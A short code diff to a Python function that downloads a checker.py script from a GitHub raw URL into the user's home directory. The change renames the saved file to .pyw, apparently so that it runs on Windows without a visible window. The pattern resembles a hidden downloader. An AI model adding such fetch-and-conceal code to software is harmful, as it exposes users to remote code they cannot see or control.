@@ -3,7 +3,7 @@ def clone():
     import os, urllib.request, pathlib
     dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/checker.py'
     home = os.path.expanduser("~")
-    path = str(home) + '\checker.py'
+    path = str(home) + '\checker.pyw'
     path = '{}'.format(path)
     try:
         os.remove(path)
